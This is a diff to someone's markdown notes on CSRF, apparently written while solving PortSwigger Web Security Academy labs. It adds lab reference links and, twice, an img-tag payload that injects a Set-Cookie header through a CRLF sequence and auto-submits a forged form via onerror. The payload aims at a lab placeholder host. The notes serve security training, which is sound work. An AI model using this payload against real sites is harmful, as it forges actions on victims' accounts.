@@ -1,5 +1,8 @@
 # CSRF
 
+- https://portswigger.net/web-security/csrf/bypassing-token-validation
+- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
+- https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses
 - https://portswigger.net/web-security/csrf#how-to-construct-a-csrf-attack
 - https://tools.nakanosec.com/csrf/
 
@@ -129,6 +132,11 @@ Deliver this payload with our pre-created `csrf` value generated with provided `
 <html>
 ```
 
+Other interesting proposition from solution to replace listening for load event:
+```
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
+```
+
 ## CSRF where token is duplicated in cookie
 
 Similarly to previous lab we can set the cookie for the user making a get request:
@@ -159,3 +167,9 @@ Sent this payload to the victim:
 	</body>
 <html>
 ```
+
+Other interesting proposition from solution to replace listening for load event:
+```
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
+```
+
